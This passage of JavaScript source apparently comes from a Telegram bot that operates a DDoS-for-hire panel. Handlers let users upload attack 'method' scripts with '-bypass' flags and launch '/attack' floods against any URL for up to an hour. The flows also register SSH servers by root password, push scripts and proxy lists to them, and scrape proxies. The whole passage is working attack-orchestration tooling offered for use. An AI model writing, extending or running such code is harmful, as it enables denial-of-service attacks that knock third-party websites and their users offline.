      await answerCB(q.id, `Added ${added} new. Total: ${total}`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_syncall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '📤 Syncing...', true);
      const servers = loadServers().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async (s) => {
        try {
          const conn = await getServerConn(s.id);
          const p = path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE);
          if (fs.existsSync(p)) await sshUpload(conn, p, `${CONFIG.REMOTE_DIR}/${CONFIG.PROXY_FILE}`);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `Synced to ${ok}/${servers.length} servers`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_clear') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      saveProxies([]);
      await answerCB(q.id, '🗑 Cleared', true);
      return showAdminProxies(chatId, msgId);
    }

    if (data === 'adm_blacklist') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const list = loadBlacklist();
      const txt = list.length === 0 ? '📭 <i>Blacklist empty.</i>' : '🚫 <b>Blacklisted:</b>\n' + list.map(h => `• <code>${esc(h)}</code>`).join('\n');
      await answerCB(q.id, '🚫 Blacklist');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_stats') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const users = loadUsers();
      const s = serverStats();
      const txt = [
        '📊 <b>Global Stats</b>',
        '',
        `👥 Users: <b>${Object.keys(users).length}</b>`,
        `📡 Servers: <b>${s.online}/${s.total}</b> online`,
        `⚔️ Sessions: <b>${[...sessions.values()].filter(x => x.status === 'running').length}</b>`,
        `🚫 Blacklist: ${loadBlacklist().length}`,
        `📦 Methods: ${availableMethods().length}`,
        `🌐 Proxies: ${readProxies().length}`,
      ].join('\n');
      await answerCB(q.id, '📊 Stats');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_refresh') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🔄 Refreshing...');
      const servers = loadServers();
      if (servers.length === 0) return edit(chatId, msgId, '📭 No servers.', { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
      let done = 0, online = 0;
      await Promise.all(servers.map(async (s) => {
        const r = await checkServerHealth(s.id, true);
        done++;
        if (r.online) online++;
        await edit(chatId, msgId, `🔄 Refreshing ${done}/${servers.length}...\n🟢 ${online} · 🔴 ${done - online}`);
      }));
      await edit(chatId, msgId,
        `✅ <b>Done</b>\n🟢 ${online} online · 🔴 ${servers.length - online} offline`,
        { reply_markup: backMenu('⬅️ Back', 'menu_admin') }
      );
      return;
    }
    if (data === 'adm_killall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const killed = stopAllSessions(null);
      await answerCB(q.id, killed > 0 ? `💀 Killed ${killed}` : '📭 None', true);
      return showAdminPanel(chatId, msgId);
    }

    if (data === 'noop') return answerCB(q.id, '');
    await answerCB(q.id, '⚠️ Unknown action');
  } catch (e) {
    console.error('[callback]', e);
    try { await answerCB(q.id, '❌ ' + e.message, true); } catch {}
  }
});

/* ══════════════════════════ MESSAGE ROUTER ══════════════════════════ */

bot.on('message', async (msg) => {
  if (!msg.text && !msg.document) return;
  const text = msg.text ? msg.text.trim() : '';

  if (text.startsWith('/')) {
    if (text === '/cancel') {
      pendingInput.delete(msg.from.id);
      return reply(msg, '❎ Cancelled.');
    }
    return;
  }

  const pending = pendingInput.get(msg.from.id);
  if (!pending || (pending.expires && Date.now() > pending.expires)) return;

  const user = ensureUserExists(msg);
  const data = pending.data || {};

  /* --- ADD PROXY FLOW --- */
  if (pending.action === 'addproxy_file') {
    if (!msg.document) return reply(msg, '❌ Please send a <code>.txt</code> file as a document.');
    const fn = msg.document.file_name || 'proxies.txt';
    if (!fn.endsWith('.txt')) return reply(msg, '❌ Must be a .txt file.');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const r = await axios.get(link, { responseType: 'text', timeout: 30000 });
      const lines = r.data.split(/\r?\n/).map(l => l.trim()).filter(l => /^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$/.test(l));
      const existing = readProxies();
      const combined = [...new Set([...existing, ...lines])];
      saveProxies(combined);
      pendingInput.delete(msg.from.id);
      await reply(msg, `✅ Added <b>${lines.length}</b> new proxies.\nTotal: <b>${combined.length}</b>`);
      return showAdminProxies(msg.chat.id, null);
    } catch (e) {
      pendingInput.delete(msg.from.id);
      return reply(msg, `❌ Upload failed: ${esc(e.message)}`);
    }
  }

  /* --- ADD METHOD FLOW --- */
  if (pending.action === 'addmethod_file') {
    if (!msg.document) return reply(msg, '❌ Please send a <code>.js</code> file as a document.');
    const fn = msg.document.file_name || 'method.js';
    if (!fn.endsWith('.js')) return reply(msg, '❌ Must be a .js file.');
    try {
      const link = await bot.getFileLink(msg.document.file_id);
      const tp = path.join(CONFIG.SCRIPT_DIR, fn);
      const r = await axios.get(link, { responseType: 'stream', timeout: 30000 });
      await new Promise((res, rej) => {
        const w = fs.createWriteStream(tp);
        r.data.pipe(w);
        w.on('finish', res);
        w.on('error', rej);
      });
      data.fileName = fn;
      pending.action = 'addmethod_name';
      pendingInput.set(msg.from.id, pending);
      return reply(msg, `✅ File <code>${fn}</code> received.\n\nStep 2/4 — Send a short method ID (letters/numbers/_/-, 2-20 chars):`);
    } catch (e) {
      pendingInput.delete(msg.from.id);
      return reply(msg, `❌ Upload failed: ${esc(e.message)}`);
    }
  }

  if (pending.action === 'addmethod_name') {
    if (!/^[a-zA-Z0-9_-]{2,20}$/.test(text)) {
      return reply(msg, '❌ Method ID must be 2-20 chars (letters/numbers/_/-). Try again or /cancel.');
    }
    if (allMethods().some(m => m.id === text.toLowerCase())) {
      return reply(msg, '❌ A method with this ID already exists. Try again or /cancel.');
    }
    data.methodId = text.toLowerCase();
    pending.action = 'addmethod_sample';
    pendingInput.set(msg.from.id, pending);
    return reply(msg,
      `✅ Method ID: <code>${data.methodId}</code>\n\n` +
      `Step 3/4 — Send the <b>sample command</b> for this method.\n\n` +
      `Include the proxy file (<code>proxy.txt</code>) and every flag you need.\n\n` +
      `Example:\n<code>node ${data.fileName} https://example.com 1200 proxy.txt 8 8000 -bypass -origin</code>\n\n` +
      `<i>Type /cancel to abort</i>`
    );
  }

  if (pending.action === 'addmethod_sample') {
    const result = parseSampleCommand(text);
    if (!result.ok) return reply(msg, `❌ ${esc(result.error)}\n\nTry again or /cancel.`);

    data.template = result.template;
    data.sampleCmd = text;
    data.warnings = result.warnings;
    pending.action = 'addmethod_confirm';
    pendingInput.set(msg.from.id, pending);

    // Build preview example
    let previewCmd = '';
    try {
      const testArgs = buildArgsFromTemplate(result.template, 'https://example.com', '60', '16', '90');
      previewCmd = `node ${data.fileName} ${testArgs.join(' ')}`;
    } catch {}

    const preview = [
      `✅ <b>Sample parsed!</b>`,
      ``,
      `📝 <b>Template:</b>`,
      `<code>${esc(result.template)}</code>`,
      ``,
      `<i>$1=target · $2=duration · $3=threads · $4=rate · {proxy}=proxy.txt</i>`,
      ``,
      `🎯 <b>Example launch:</b>`,
      `<code>/attack ${data.methodId} https://example.com 60</code>`,
      ``,
      `🔧 <b>Will run:</b>`,
      `<code>${esc(previewCmd)}</code>`,
    ];

    if (result.warnings.length) {
      preview.push('');
      result.warnings.forEach(w => preview.push(`⚠️ ${esc(w)}`));
    }

    preview.push('');
    preview.push('<b>Save this method?</b>');

    return bot.sendMessage(msg.chat.id, preview.join('\n'), {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [{ text: '✅ Save & Sync', callback_data: 'addmethod_save', style: 'success' }],
          [{ text: '❌ Cancel', callback_data: 'addmethod_cancel', style: 'danger' }],
        ],
      },
    });
  }

  /* --- QUICK LAUNCH --- */
  if (pending.action === 'quick_launch_target') {
    if (!/^https?:\/\//i.test(text)) return reply(msg, '❌ URL must start with <code>https://</code>. Try again or /cancel.');
    pending.action = 'quick_launch_duration';
    pending.data.target = text;
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `⏱ <b>Step 2/2 — Duration</b>\n\nSend duration in seconds (e.g. <code>60</code>)\n<i>/cancel to abort</i>`);
  }
  if (pending.action === 'quick_launch_duration') {
    const duration = parseInt(text, 10);
    if (!duration || duration < 1 || duration > 3600) return reply(msg, '❌ Duration must be 1-3600. Try again or /cancel.');
    const { methodId, target } = pending.data;
    pendingInput.delete(msg.from.id);
    const method = getMethod(methodId);
    if (!method) return reply(msg, '❌ Method gone.');
    const cd = cooldowns.get(msg.from.id);
    if (cd && cd.until > Date.now()) return reply(msg, `⏳ Cooldown: <b>${Math.ceil((cd.until - Date.now()) / 1000)}s</b>.`);
    let parsed;
    try {
      parsed = method.parse([target, String(duration)]);
      const t = validateTarget(parsed.target);
      if (isBlacklisted(t.host)) return reply(msg, `🚫 Blacklisted.`);
      checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return runAttack(user, method, parsed, msg.chat.id);
  }

  /* --- ADD SERVER FLOW --- */
  if (pending.action === 'addserver_addr') {
    if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ Format: <code>ip:port</code>');
    data.addr = text;
    pending.action = 'addserver_user';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '👤 Step 2/3 — Send SSH username (e.g. <code>root</code>):');
  }
  if (pending.action === 'addserver_user') {
    data.username = text;
    pending.action = 'addserver_pass';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '🔑 Step 3/3 — Send SSH password:\n<i>(this message will be deleted)</i>');
  }
  if (pending.action === 'addserver_pass') {
    data.password = text;
    pending.action = 'addserver_name';
    pendingInput.set(msg.from.id, pending);
    try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}
    return reply(msg, '🏷 Send a short name for this server (e.g. <code>US-Node-1</code>):');
  }
  if (pending.action === 'addserver_name') {
    const name = text;
    pendingInput.delete(msg.from.id);
    const [host, portStr] = data.addr.split(':');
    const port = parseInt(portStr, 10);
    const id = newServerId();
    const sm = await reply(msg, '🔄 Testing SSH connection...');
    const server = { id, host, port, username: data.username, password: data.password, name, status: 'testing', addedBy: msg.from.id, addedAt: new Date().toISOString(), lastCheck: 0 };
    try {
      const conn = await sshConnect(server);
      conn.end();
      upsertServer({ ...server, status: 'online', lastCheck: Date.now() });
      await edit(msg.chat.id, sm.message_id,
        `✅ <b>Server added!</b>\nName: ${name}\nHost: <code>${host}:${port}</code>\n\n` +
        `<i>Use "Sync All Methods" in Manage Servers to push scripts.</i>`
      );
    } catch (e) {
      await edit(msg.chat.id, sm.message_id, `❌ SSH failed: <code>${esc(e.message.slice(0, 100))}</code>`);
    }
    return;
  }

  /* --- SET LIMITS --- */
  if (pending.action === 'set_limit_duration') {
    const val = parseInt(text, 10);
    if (isNaN(val) || val < 0) return reply(msg, '❌ Must be a number. Send 0 for unlimited.');
    const { targetId } = data;
    const targetUser = getUser(targetId);
    if (!targetUser) return reply(msg, '❌ User not found.');
    upsertUser(targetId, { limits: { ...(targetUser.limits || {}), maxDuration: val } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Max duration: <b>${val === 0 ? 'Unlimited' : val + 's'}</b>.`);
    return showUserActions(msg.chat.id, null, targetId);
  }
  if (pending.action === 'set_limit_conc') {
    const val = parseInt(text, 10);
    if (isNaN(val) || val < 0) return reply(msg, '❌ Must be a number. Send 0 for unlimited.');
    const { targetId } = data;
    const targetUser = getUser(targetId);
    if (!targetUser) return reply(msg, '❌ User not found.');
    upsertUser(targetId, { limits: { ...(targetUser.limits || {}), maxConcurrent: val } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Max concurrent: <b>${val === 0 ? 'Unlimited' : val}</b>.`);
    return showUserActions(msg.chat.id, null, targetId);
  }
});

/* ══════════════════════════ STARTUP ══════════════════════════ */

(async () => {
  console.log('[bot] starting v12 (advanced method parser)...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);
  console.log('[bot] methods:', availableMethods().map(m => m.id).join(', ') || '(none)');

  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin', createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] admin ${id} bootstrapped`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  const servers = loadServers();
  if (servers.length > 0) {
    console.log(`[bot] pre-warming ${servers.length} server connections...`);
    prewarmServers(servers.map(s => s.id)).then(() => {
      const online = servers.filter(s => serverConns.has(s.id)).length;
      console.log(`[bot] ${online}/${servers.length} servers connected`);
    }).catch(() => {});
  }

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] scraping proxies...');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch (e) { console.error('[bot]', e.message); }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] bye'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] bye'); process.exit(0); });